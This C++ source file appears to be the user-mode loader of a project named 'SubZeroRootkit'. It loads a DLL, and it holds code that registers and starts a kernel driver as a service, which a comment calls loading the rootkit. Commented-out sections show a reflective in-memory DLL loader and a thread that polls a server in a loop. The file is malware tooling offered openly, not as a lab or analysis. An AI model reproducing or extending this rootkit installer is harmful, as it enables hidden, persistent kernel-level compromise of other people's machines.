#include "pch.h"
#include "..\SubZeroDriver\SubZeroCommon.h"
#include "ServiceManager.h"
#include "RegistryManager.h"

constexpr DWORD regType = 1;
constexpr DWORD regStart = 2;
constexpr DWORD regErrorControl = 0;
constexpr const WCHAR* regDescription = L"X";
constexpr const WCHAR* driverPath = L"C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Debug\\SubZeroDriver.sys";

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int wmain(int argc, wchar_t* argv[]) {


	LoadLibraryW(L"S:\\Projects\\SubZeroRootkit\\x64\\Release\\SubZeroDLL.dll");
	return 0;
	

	//HttpClient::client_();
	//HANDLE hout;
	//hout = CreateFile(L"C:\\Users\\danie\\Desktop\\New folder (2)\\SubZeroDLL.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//hout = CreateFile(L"C:\\temp\\SubZeroDLL.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//if (hout == INVALID_HANDLE_VALUE) return 1;
	//
	//DWORD size = GetFileSize(hout, NULL);
	//BYTE* file = new BYTE[size];
	//::ReadFile(hout, file, size, &size, NULL);
	//
	//PMEMORY_MODULE module = ReflectiveLibraryLoader::MemoryLoadLibrary(file, size);
	//
	//ReflectiveLibraryLoader::MemoryFreeLibrary(module);
	//
	//CloseHandle(hout);

	//DWORD seconds = 5;
	//HANDLE hThread = ::CreateThread(
	//	nullptr,                          // default security attributes
	//	0,                                // use default stack size  
	//	HttpClient::FetchFromServerLoop,  // thread function name
	//	&seconds,						  // argument to thread function 
	//	0,                                // use default creation flags 
	//	nullptr);                 // returns the thread identifier 
	//
	//if (!hThread)
	//{
	//	// Thread creation failed.
	//	// More details can be retrieved by calling GetLastError()
	//	return FALSE;
	//}
	//::SleepEx(INFINITE, FALSE);
	//
	// return 1;

	HKEY hKey;
	hKey = RegistryManager::CreateRegistryKey(HKEY_LOCAL_MACHINE, REG_SZ_KEY_PATH);

	if (!hKey) {
		DEBUG_PRINT("[-] Error creating registry key " << GetLastError());
		return 1;
	}

	size_t dwLetterSize = sizeof(WCHAR);
	if (!(RegistryManager::SetRegistryValue(hKey, L"Type", REG_DWORD, (PVOID)&regType, sizeof(regType)) &&
		RegistryManager::SetRegistryValue(hKey, L"Start", REG_DWORD, (PVOID)&regStart, sizeof(regStart)) &&
		RegistryManager::SetRegistryValue(hKey, L"ErrorControl", REG_DWORD, (PVOID)&regErrorControl, sizeof(regErrorControl)) &&
		RegistryManager::SetRegistryValue(hKey, L"ImagePath", REG_EXPAND_SZ, (PVOID)driverPath, wcslen(driverPath) * dwLetterSize) &&
		RegistryManager::SetRegistryValue(hKey, L"DisplayName", REG_SZ, (PVOID)WDRIVER_NAME, wcslen(WDRIVER_NAME) * dwLetterSize) &&
		RegistryManager::SetRegistryValue(hKey, L"Description", REG_SZ, (PVOID)regDescription, wcslen(regDescription) * dwLetterSize) &&
		::RegCloseKey(hKey) == ERROR_SUCCESS))
	{
		DEBUG_PRINT("[-] Error setting registry values " << GetLastError());
		return 1;
	}

	// Load rootkit
	ServiceManager scm(WDRIVER_NAME, driverPath, SERVICE_KERNEL_DRIVER);

	if (!scm.Install()) {
		DEBUG_PRINT("[-] Error installing the service");
		return 1;
	}

	DEBUG_PRINT("[+] Service installed");

	if (!scm.Start()) {
		DEBUG_PRINT("[-] Error starting the service");

		if (!scm.Remove()) // Also removes registry key
			DEBUG_PRINT("[-] Error removing the service");
		return 1;
	}

	DEBUG_PRINT("[+] Service started");
	return 0;
}